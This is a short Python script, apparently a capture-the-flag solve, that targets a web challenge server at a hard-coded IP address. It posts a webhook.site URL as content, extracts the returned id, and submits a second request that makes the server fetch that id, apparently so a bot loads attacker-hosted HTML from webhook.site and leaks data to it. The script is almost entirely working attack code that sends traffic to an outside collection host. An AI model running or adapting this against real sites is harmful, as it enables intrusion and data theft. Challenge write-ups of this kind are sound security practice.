import requests
import re

# Update Webhook with the html file.

BASE_URL = 'http://34.124.157.94:5002'
# BASE_URL = 'http://127.0.0.1:5002'
WEBHOOK_URL = 'https://webhook.site/2e67dca5-3a8b-4d20-a37c-0b673e690da7'

with requests.Session() as s:
    resp = s.get(f'{BASE_URL}')
    assert resp.status_code == 200, 'Server is down'

    resp = s.post(f'{BASE_URL}/send_post', data={    
        'title': 'test',
        'content': WEBHOOK_URL
    })

    assert resp.status_code != 500, "Internal Server Error occurred, please check on challenge server."
    assert "Url id:" in resp.text, "Url id: Not found"

    search_results = re.findall('Url id: (\d+)', resp.text)
    url_id = search_results[0]

    resp = s.post(f'{BASE_URL}/send_post', data={    
        'url': f'/url/{url_id}',
        'title': 'test',
        'content': WEBHOOK_URL
    })

    
